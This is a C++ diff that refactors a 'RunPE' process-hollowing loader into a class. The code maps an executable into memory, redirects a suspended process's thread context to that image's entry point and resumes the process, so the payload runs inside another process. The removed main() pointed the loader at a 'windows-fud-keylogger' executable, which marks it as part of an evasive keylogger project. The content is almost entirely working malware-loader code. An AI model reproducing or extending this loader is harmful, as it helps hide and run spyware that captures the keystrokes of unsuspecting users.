@@ -1,13 +1,15 @@
 #include "pch.h"
+#include "loadpe.h"
 
 //////////
 /// CODE BY : https://github.com/codecrack3/Run-PE---Run-Portable-Executable-From-Memory
 //////////
 
 // use this if you want to read the executable from disk
-HANDLE MapFileToMemory(LPCSTR filename) {
+HANDLE loadpe::loadFile(const LPCSTR& filename) {
 	std::streampos size;
 	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
+	
 	if (file.is_open()) {
 		size = file.tellg();
 
@@ -22,7 +24,7 @@ HANDLE MapFileToMemory(LPCSTR filename) {
 	return 0;
 }
 
-int RunPortableExecutable(void* Image) {
+int loadpe::runPE(void* Image) {
 	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
 	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
 	IMAGE_SECTION_HEADER* SectionHeader;
@@ -55,7 +57,7 @@ int RunPortableExecutable(void* Image) {
 			// Allocate memory for the context.
 			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
 			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated
-			
+
 			//if context is in thread
 			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
 				// Read instructions
@@ -79,29 +81,12 @@ int RunPortableExecutable(void* Image) {
 				// Move address of entry point to the eax register
 				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
 				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
-				ResumeThread(PI.hThread); //´Start the process/call main()
+				ResumeThread(PI.hThread); //Start the process/call main()
 
-				std::cout << "[+] SUCCESS" << std::endl;
 				return 0; // Operation was successful.
 			}
 		}
 	}
-
-	std::cout << "[!] ERROR" << std::endl;
+	
 	return 1;
-}
-
-// enter valid bytes of a program here.
-unsigned char rawData[37376] = {
-	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
-	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-};
-
-
-int main() {
-	std::cout << "[+] START" << std::endl;
-	const auto raw = MapFileToMemory("C:\\Projects\\windows-fud-keylogger\\build\\release\\x86-32\\windows-fud-keylogger-r32.exe");
-	RunPortableExecutable(raw);
-	std::cout << "[-] END" << std::endl;
-	std::cin.get();
 }
